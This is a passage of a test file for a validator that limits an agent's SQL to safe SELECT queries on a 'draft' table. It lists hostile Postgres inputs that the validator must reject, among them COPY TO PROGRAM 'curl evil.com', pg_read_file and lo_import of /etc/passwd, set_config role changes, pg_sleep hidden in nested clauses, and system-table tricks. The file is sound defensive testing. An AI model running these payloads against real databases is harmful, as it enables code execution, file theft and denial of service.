    await rejects("SELECT (SELECT * FROM pg_roles) FROM draft", /not allowed|draft/i);
  });
});

// ---------------------------------------------------------------------------
// False positive regression — safe SQL with blocked keywords in literals
// ---------------------------------------------------------------------------

describe("false positive regression", () => {
  test("keyword 'set' in column alias", async () => {
    await accepts(
      `SELECT elem->>'item' AS "set" FROM draft, jsonb_array_elements(draft.data) elem`,
    );
  });

  test("keyword 'reset' in string literal", async () => {
    await accepts(
      `SELECT elem->>'item' FROM draft, jsonb_array_elements(draft.data) elem WHERE elem->>'status' = 'reset'`,
    );
  });

  test("keyword 'execute' in string literal", async () => {
    await accepts(
      `SELECT elem->>'item' FROM draft, jsonb_array_elements(draft.data) elem WHERE elem->>'op' = 'execute'`,
    );
  });

  test("keyword 'do' in string literal", async () => {
    await accepts(
      `SELECT elem->>'item' FROM draft, jsonb_array_elements(draft.data) elem WHERE elem->>'mode' = 'do'`,
    );
  });

  test("keyword 'rollback' in string literal", async () => {
    await accepts(
      `SELECT elem->>'item' FROM draft, jsonb_array_elements(draft.data) elem WHERE elem->>'state' = 'rollback'`,
    );
  });

  test("keyword 'truncate' in string literal", async () => {
    await accepts(
      `SELECT elem->>'item' FROM draft, jsonb_array_elements(draft.data) elem WHERE elem->>'cmd' = 'truncate'`,
    );
  });
});

// ===========================================================================
// Adversarial attacks (Task #13)
// ===========================================================================

describe("adversarial attacks", () => {
  // -------------------------------------------------------------------------
  // Identity leakage via unblocked SQLValueFunction ops
  // -------------------------------------------------------------------------

  describe("identity leakage: unblocked SVFOP variants", () => {
    // pgsql-parser produces SVFOP_USER for bare `user`, which is different from
    // SVFOP_CURRENT_USER. If the blocked set only has CURRENT_USER, bare `user`
    // slips through and leaks the database role name.
    test("rejects bare SELECT user (SVFOP_USER)", async () => {
      await rejects("SELECT user", /not allowed/i);
    });

    // current_catalog leaks the database name — useful for reconnaissance
    test("rejects SELECT current_catalog (SVFOP_CURRENT_CATALOG)", async () => {
      await rejects("SELECT current_catalog", /not allowed/i);
    });

    // current_schema leaks the search_path — reveals internal naming
    test("rejects SELECT current_schema (SVFOP_CURRENT_SCHEMA)", async () => {
      await rejects("SELECT current_schema", /not allowed/i);
    });
  });

  // -------------------------------------------------------------------------
  // SELECT INTO — DDL disguised as SELECT
  // -------------------------------------------------------------------------

  describe("SELECT INTO: DDL smuggled inside SelectStmt", () => {
    // SELECT INTO creates a new table. pgsql-parser parses it as a SelectStmt
    // with an intoClause property. If the validator only checks statement type
    // === SelectStmt, this bypasses the DDL block entirely.
    test("rejects SELECT ... INTO TEMPORARY", async () => {
      await rejects("SELECT 1 INTO TEMPORARY evil", /into.*not allowed|only.*select/i);
    });

    test("rejects SELECT ... INTO", async () => {
      await rejects("SELECT 1 INTO evil FROM draft", /into.*not allowed|only.*select/i);
    });
  });

  // -------------------------------------------------------------------------
  // FOR UPDATE/SHARE — side effects smuggled as SELECT
  // -------------------------------------------------------------------------

  describe("FOR UPDATE/SHARE: locking side effects in SelectStmt", () => {
    // FOR UPDATE acquires row locks — a DoS vector if agent_query ever gets
    // UPDATE privilege. DB layer currently blocks it (SELECT-only grant on
    // draft), but the validator should reject it for defense-in-depth and
    // better error messages.
    test.each([
      ["FOR UPDATE", "SELECT * FROM draft FOR UPDATE"],
      ["FOR SHARE", "SELECT * FROM draft FOR SHARE"],
      ["FOR NO KEY UPDATE", "SELECT * FROM draft FOR NO KEY UPDATE"],
      ["FOR KEY SHARE", "SELECT * FROM draft FOR KEY SHARE"],
      ["FOR UPDATE NOWAIT", "SELECT * FROM draft FOR UPDATE NOWAIT"],
      ["FOR UPDATE SKIP LOCKED", "SELECT * FROM draft FOR UPDATE SKIP LOCKED"],
    ])("rejects %s", async (_variant, sql) => {
      await rejects(sql, /for update|for share|not allowed/i);
    });
  });

  // -------------------------------------------------------------------------
  // Named dangerous functions — exercising the same allowlist check as
  // pg_sleep et al., but documenting the scariest vectors by name.
  // -------------------------------------------------------------------------

  describe("named dangerous functions", () => {
    test.each([
      // query_to_xml executes arbitrary SQL internally — SQL injection via argument
      ["query_to_xml", "SELECT query_to_xml('SELECT * FROM pg_roles', true, false, '') FROM draft"],
      // Large object functions — file system read/write (RCE-adjacent)
      ["lo_import", "SELECT lo_import('/etc/passwd') FROM draft"],
      ["lo_export", "SELECT lo_export(1234, '/tmp/evil') FROM draft"],
    ])("rejects %s", async (_name, sql) => {
      await rejects(sql, /not allowed/i);
    });
  });

  // -------------------------------------------------------------------------
  // RangeFunction — blocked function in FROM clause (different AST node
  // than FuncCall in SELECT list; walk must descend into RangeFunction)
  // -------------------------------------------------------------------------

  describe("blocked functions in FROM clause (RangeFunction)", () => {
    test("rejects generate_series in FROM", async () => {
      await rejects("SELECT * FROM generate_series(1, 1000000000)", /not allowed/i);
    });

    test("rejects generate_series in FROM with alias", async () => {
      await rejects("SELECT g FROM generate_series(1, 100) AS g", /not allowed/i);
    });
  });

  // -------------------------------------------------------------------------
  // COPY TO PROGRAM — literal RCE, blocked at stage 3 (non-SELECT)
  // -------------------------------------------------------------------------

  test("rejects COPY TO PROGRAM (RCE)", async () => {
    await rejects("COPY draft TO PROGRAM 'curl evil.com'", /only select/i);
  });

  // -------------------------------------------------------------------------
  // Evil functions hidden in deep structural positions
  // -------------------------------------------------------------------------

  describe("functions hidden in structural positions", () => {
    const hiddenFuncCases = [
      {
        sql: "SELECT CASE WHEN pg_sleep(1) IS NOT NULL THEN 1 ELSE 0 END FROM draft",
        shouldPass: false,
        reason: "pg_sleep hiding inside CASE WHEN condition",
      },
      {
        sql: "SELECT COALESCE(pg_sleep(1)::text, 'safe') FROM draft",
        shouldPass: false,
        reason: "pg_sleep hiding inside COALESCE args",
      },
      {
        sql: "SELECT count(*) FILTER (WHERE pg_sleep(1) IS NOT NULL) FROM draft",
        shouldPass: false,
        reason: "pg_sleep hiding inside aggregate FILTER clause",
      },
      {
        sql: "SELECT sum(1) OVER (ORDER BY pg_sleep(1)) FROM draft",
        shouldPass: false,
        reason: "pg_sleep hiding inside window function ORDER BY",
      },
      {
        sql: "SELECT 1 FROM draft GROUP BY 1 HAVING pg_sleep(1) IS NOT NULL",
        shouldPass: false,
        reason: "pg_sleep hiding inside HAVING clause",
      },
      {
        sql: "SELECT 1 FROM draft WHERE EXISTS (SELECT pg_sleep(1))",
        shouldPass: false,
        reason: "pg_sleep hiding inside EXISTS subquery",
      },
      {
        sql: "SELECT 1 FROM draft WHERE 1 = ANY(SELECT generate_series(1, 1000000))",
        shouldPass: false,
        reason: "generate_series hiding inside ANY() subquery",
      },
      {
        sql: "SELECT * FROM draft, LATERAL (SELECT pg_sleep(1)) AS evil",
        shouldPass: false,
        reason: "pg_sleep hiding inside LATERAL subquery",
      },
      {
        sql: "WITH cte AS (SELECT pg_sleep(1) AS x) SELECT * FROM cte",
        shouldPass: false,
        reason: "pg_sleep hiding inside CTE body",
      },
      {
        sql: `SELECT ARRAY[pg_sleep(1)] FROM draft`,
        shouldPass: false,
        reason: "pg_sleep hiding inside array constructor",
      },
      {
        sql: "SELECT ROW(pg_sleep(1), 1) FROM draft",
        shouldPass: false,
        reason: "pg_sleep hiding inside ROW constructor",
      },
      {
        sql: "SELECT 1 FROM draft ORDER BY pg_sleep(1)",
        shouldPass: false,
        reason: "pg_sleep hiding inside ORDER BY clause",
      },
      {
        sql: "SELECT count(pg_sleep(1)) FROM draft",
        shouldPass: false,
        reason: "pg_sleep hiding as argument to an allowed aggregate",
      },
    ] as const;

    test.each(hiddenFuncCases)("rejects: $reason", async ({ sql }) => {
      await rejects(sql, /not allowed/i);
    });
  });

  // -------------------------------------------------------------------------
  // Table reference tricks
  // -------------------------------------------------------------------------

  describe("table reference tricks", () => {
    const tableTricks = [
      {
        sql: "SELECT * FROM pg_roles AS draft",
        shouldPass: false,
        reason: "system table aliased as draft — relname is still pg_roles",
      },
      {
        sql: "SELECT * FROM draft, pg_roles",
        shouldPass: false,
        reason: "draft cross-joined with system table",
      },
      {
        sql: "SELECT * FROM public.draft",
        shouldPass: false,
        reason: "schema-qualified draft — could point to a different schema",
      },
      {
        sql: "SELECT * FROM pg_temp.evil",
        shouldPass: false,
        reason: "pg_temp schema — temp table bypass",
      },
      {
        sql: "SELECT * FROM (SELECT * FROM pg_roles) AS draft",
        shouldPass: false,
        reason: "subquery wrapping system table aliased as draft",
      },
      {
        sql: `SELECT * FROM draft UNION SELECT rolname FROM pg_roles`,
        shouldPass: false,
        reason: "UNION second arm reading system table",
      },
      {
        sql: `SELECT * FROM draft UNION ALL SELECT setting FROM pg_settings`,
        shouldPass: false,
        reason: "UNION ALL second arm reading pg_settings",
      },
    ] as const;

    test.each(tableTricks)("rejects: $reason", async ({ sql }) => {
      await rejects(sql, /not allowed/i);
    });
  });

  // -------------------------------------------------------------------------
  // Type system attacks
  // -------------------------------------------------------------------------

  describe("type system attacks", () => {
    const typeCastAttacks = [
      {
        sql: "SELECT 'pg_roles'::text::regclass FROM draft",
        shouldPass: false,
        reason: "chained cast through text to regclass — inner TypeCast must be caught",
      },
      {
        sql: "SELECT ARRAY['pg_roles']::regclass[] FROM draft",
        shouldPass: false,
        reason: "array of regclass — arrayBounds variant of pseudo-type",
      },
      {
        sql: "SELECT CASE WHEN true THEN 'pg_roles'::regclass ELSE 0 END FROM draft",
        shouldPass: false,
        reason: "regclass cast hiding inside CASE expression",
      },
      {
        sql: "SELECT lower('pg_roles'::regclass::text) FROM draft",
        shouldPass: false,
        reason: "regclass cast used as argument to allowed function",
      },
      {
        sql: "SELECT 1 FROM draft WHERE 'pg_roles'::regclass IS NOT NULL",
        shouldPass: false,
        reason: "regclass cast hiding in WHERE clause",
      },
    ] as const;

    test.each(typeCastAttacks)("rejects: $reason", async ({ sql }) => {
      await rejects(sql, /not allowed|pseudo-type/i);
    });
  });

  // -------------------------------------------------------------------------
  // Statement smuggling
  // -------------------------------------------------------------------------

  describe("statement smuggling", () => {
    const smugglingCases = [
      {
        sql: "CREATE TABLE evil AS SELECT 1",
        shouldPass: false,
        reason: "CTAS (CREATE TABLE AS SELECT) — DDL disguised with SELECT",
      },
      {
        sql: "CREATE TEMP TABLE evil AS SELECT * FROM draft",
        shouldPass: false,
        reason: "temp table creation from SELECT",
      },
      {
        sql: "EXPLAIN ANALYZE SELECT * FROM draft",
        shouldPass: false,
        reason: "EXPLAIN ANALYZE — executes the query and reveals plan metadata",
      },
    ] as const;

    test.each(smugglingCases)("rejects: $reason", async ({ sql }) => {
      await rejects(sql, /only select|not allowed/i);
    });
  });

  // -------------------------------------------------------------------------
  // Abusing allowed functions
  // -------------------------------------------------------------------------

  describe("abusing allowed functions", () => {
    const abuseCases = [
      {
        sql: `SELECT format('%s.%s', 'pg_catalog', 'pg_roles') FROM draft`,
        shouldPass: true,
        reason: "format() building a string — harmless, it's just data not code",
      },
      {
        sql: `SELECT concat('pg_', 'sleep') FROM draft`,
        shouldPass: true,
        reason: "concat() building a function name — harmless as a string",
      },
    ] as const;

    test.each(abuseCases.filter((c) => c.shouldPass))("accepts: $reason", async ({ sql }) => {
      await accepts(sql);
    });
  });

  // -------------------------------------------------------------------------
  // Parser/Postgres disagreement (encoding, edge cases)
  // -------------------------------------------------------------------------

  describe("parser edge cases", () => {
    // Comment injection is handled at parse time — AST strips comments
    test("rejects comment-split function name: pg_/**/sleep", async () => {
      await rejects("SELECT pg_sleep/* */(1) FROM draft", /not allowed/i);
    });

    // Mixed case is normalized by the parser
    test("rejects mixed-case: sEt_CoNfIg", async () => {
      await rejects("SELECT sEt_CoNfIg('role', 'x', true) FROM draft", /not allowed/i);
    });

    // Unicode escape resolves at parse time
    test('rejects Unicode escape function: U&"set_config" equivalent', async () => {
      await rejects(
        `SELECT U&"\\0073et_config"('request.user_id', 'hacker', true) FROM draft`,
        /not allowed/i,
      );
    });

    // Semicolons inside string literals are part of the string, not statement terminators
    test("accepts semicolons inside string literals", async () => {
      await accepts("SELECT 'a;b;c' FROM draft");
    });
  });

  // -------------------------------------------------------------------------
  // Validator self-DoS (stack overflow, performance)
  // -------------------------------------------------------------------------

  describe("validator self-DoS", () => {
    test("handles deeply nested subqueries (50 levels) without stack overflow", async () => {
      let sql = "SELECT 1 FROM draft";
      for (let i = 0; i < 50; i++) {
        sql = `SELECT (${sql}) FROM draft`;
      }
      // Should either accept (it's valid SQL) or reject — but must not crash
      await expect(validateAgentSql(sql)).resolves.toBeUndefined();
    });

    test("rejects empty string", async () => {
      await rejects("", /parse error|empty/i);
    });

    test("rejects whitespace-only", async () => {
      await rejects("   ", /parse error|empty/i);
    });

    test("rejects comment-only SQL", async () => {
      // pgsql-parser returns 0 statements for comment-only input
      await rejects("/* just a comment */", /single.*statement|got 0/i);
    });
  });

  // -------------------------------------------------------------------------
  // False positives: safe SQL that looks scary
  // -------------------------------------------------------------------------

  describe("false positives: safe SQL that looks scary", () => {
    test("accepts string literal containing 'pg_sleep'", async () => {
      await accepts(`SELECT 'pg_sleep(1)' FROM draft`);
    });

    test("accepts column named like a system table", async () => {
      await accepts(`SELECT draft.data->>'pg_roles' FROM draft`);
    });

    test("accepts string literal containing semicolons and DML", async () => {
      await accepts(`SELECT 'DROP TABLE draft; DELETE FROM evil;' FROM draft`);
    });

    test("accepts parameterized query with suspicious parameter position", async () => {
      await accepts("SELECT * FROM draft WHERE draft.data->>'id' = $1");
    });
  });

  // -------------------------------------------------------------------------
  // Schema-qualified blocked functions via pg_catalog
  // -------------------------------------------------------------------------

  describe("pg_catalog schema bypass attempts", () => {
    test("rejects pg_catalog.pg_sleep — allowed schema but blocked function", async () => {
      await rejects("SELECT pg_catalog.pg_sleep(1) FROM draft", /not allowed/i);
    });

    test("rejects pg_catalog.set_config — allowed schema but blocked function", async () => {
      await rejects("SELECT pg_catalog.set_config('role', 'x', true) FROM draft", /not allowed/i);
    });

    test("rejects pg_catalog.pg_read_file — allowed schema but blocked function", async () => {
      await rejects("SELECT pg_catalog.pg_read_file('/etc/passwd') FROM draft", /not allowed/i);
    });

    test("accepts pg_catalog.lower — allowed schema with allowed function", async () => {
      await accepts("SELECT pg_catalog.lower('ABC') FROM draft");
    });
  });

  // -------------------------------------------------------------------------
  // Additional maintenance/admin statement types
  // -------------------------------------------------------------------------

  describe("additional blocked statement types", () => {
    test("rejects VACUUM", async () => {
      await rejects("VACUUM draft", /only select/i);
    });

    test("rejects ANALYZE", async () => {
      await rejects("ANALYZE draft", /only select/i);
    });

    test("rejects REINDEX", async () => {
      await rejects("REINDEX TABLE draft", /only select/i);
    });

    test("rejects LOCK TABLE", async () => {
      await rejects("LOCK TABLE draft IN ACCESS SHARE MODE", /only select/i);
    });

    test("rejects CLUSTER", async () => {
      await rejects("CLUSTER draft", /only select/i);
    });
  });

  // -------------------------------------------------------------------------
  // CTE edge cases: blocked functions in nested positions
  // -------------------------------------------------------------------------

  describe("CTE with blocked functions in nested positions", () => {
    test("rejects blocked function in CTE body with outer SELECT referencing CTE", async () => {
      await rejects(
        "WITH evil AS (SELECT pg_read_file('/etc/passwd') AS content FROM draft) SELECT * FROM evil",
        /not allowed/i,
      );
    });

    test("rejects blocked table in CTE body", async () => {
      await rejects("WITH evil AS (SELECT * FROM pg_roles) SELECT * FROM evil", /not allowed/i);
    });

    test("rejects blocked type cast in CTE body", async () => {
      await rejects(
        "WITH evil AS (SELECT 'pg_roles'::regclass FROM draft) SELECT * FROM evil",
        /not allowed|pseudo-type/i,
      );
    });
  });
});
